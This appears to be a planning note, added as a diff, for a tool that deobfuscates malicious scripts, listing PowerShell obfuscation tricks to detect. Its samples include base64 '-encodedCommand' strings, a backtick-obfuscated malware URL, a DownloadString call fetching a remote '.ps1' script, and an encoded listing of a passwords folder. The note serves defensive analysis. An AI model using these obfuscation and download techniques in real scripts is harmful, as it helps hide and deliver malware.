@@ -1,0 +1,50 @@
+# modules
+Modules to interpret code. allow it to have the commands pasted in (must accept multiple lines) or read from a file. 
+- batch: 
+  - if file, does it end in ".bat"
+  - what other file extensions could be used? is one needed at all? 
+- cmd: 
+  - if file, does it end in "???"
+  - what other file extensions could be used? is one needed at all? 
+- javascript: 
+  - if file, does it end in ".js"
+  - what other file extensions could be used? is one needed at all? 
+- powershell: 
+    Powershell can be executed in either one of the following ways:
+    - Registry: This technique was extensively used by Poweliks and kovter malware variants ( mshta or rundll + ActiveXObject).
+    - File: .ps1 / .VBS / .BAT and scheduled task.
+    - Macros: Office files- Word, Excel, etc.
+    - Remotely: PowerShell Remoting (PSS), PsExec, WMI.
+  - if file, does it end in ".ps1"
+  - what other file extensions could be used? is one needed at all? 
+  - save copy of each iteration from original code to final with labels in a pdf
+  - read line by line or determine new line = ;
+  - check for encoding tricks
+    - base64
+      - ``` -encodedCommand ```
+        - ``` powershell.exe -encodedCommand dwBoAG8AYQBtAGkA ```
+      - ``` [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(' ') ```
+        - ``` [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA') ```
+      - ``` Start-Process “dir “c:\passwords”” à ZABpAHIAIAAiAGMAOgBcAHAAYQBzAHMAdwBvAHIAZABzACIAIAA=0g ```
+    - hex bytes
+    - variable substitution
+    - substitution {0}(1}{2} -f $variable, text, int
+    - Non-escape characters
+    - Up\Low case– random uppercase or lowercase in the script
+    - white spaces– random white spaces are inserted between words
+    - escape character (`) will try to trick the analyst to understand the command, they are typically inserted into the middle of the string
+      - ``` http://malware.com/cybad.exe à $a = (“http://mal`ware.c`om.cy`bad.ex`e”) ```
+      - https://ss64.com/ps/syntax-esc.html
+      - https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_special_characters?view=powershell-7.3
+    - Catenations like: " + " (use regex to look for one or more ' [single quotes] or " [double quotes])
+    - split and join
+    - reverse text
+    - ScriptBlock
+    - Downloading other files
+      - ``` (New-Object Net.WebClient).DownloadString(’http://www.demo.local/cybad.ps1’) ```
+- python: 
+  - if file, does it end in ".py" 
+  - what other file extensions could be used? is one needed at all? 
+- vbscript: 
+  - if file, does it end in ".vbs" 
+  - what other file extensions could be used? is one needed at all? 
